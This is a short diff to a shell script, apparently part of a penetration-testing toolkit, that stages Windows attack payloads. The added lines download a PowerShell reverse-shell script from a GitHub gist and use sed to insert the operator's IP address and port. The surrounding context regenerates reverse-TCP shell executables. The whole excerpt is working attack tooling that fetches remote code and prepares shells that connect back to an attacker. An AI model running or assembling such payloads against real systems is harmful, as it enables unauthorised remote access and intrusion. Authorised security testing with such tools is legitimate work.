@@ -11,6 +11,11 @@ cd public/payloads_windows
         rm -rf Window-Tools
     fi
 
+    rm mini-reverse.ps1
+    wget https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1
+    sed -i "s/127.0.0.1/$source_ip/g" mini-reverse.ps1
+    sed -i "s/413/$source_port/g" mini-reverse.ps1
+
     if [ ! -f shell_reverse_tcp_x86.exe ] || confirm "Regenerate payloads_windows [y/n]? " ; then
         # Reverse shells
         banner "payloads_windows: shell_reverse_tcp_*.exe"
